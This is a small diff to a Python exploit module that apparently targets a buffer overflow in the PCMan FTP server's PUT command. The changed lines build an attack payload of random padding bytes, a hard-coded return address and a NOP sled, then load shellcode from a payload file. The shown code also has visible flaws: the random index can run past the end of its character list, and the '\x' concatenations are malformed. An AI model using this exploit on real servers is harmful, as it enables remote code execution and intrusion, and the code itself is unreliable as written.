@@ -80,7 +80,7 @@ class pcmanPutOverflowMenu(cmd.Cmd):
     char = ["1", "2", "3", "4", "5", "6", "7", "8", "9", "0", "a", "b", "c", "d", "e", "f"]
     payload = ""
     for a in range(0, 2017):
-      payload += "\x" + char[random.randint(0, 16)] + char[random.randint(0, 16)]
+      payload += "\x" + char[randint(0, 16)] + char[randint(0, 16)]
     payload += "\x77\xc3\x54\x59"
     payload += "\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
     f = open("../../../payloads/pcman_put.shell", "r")
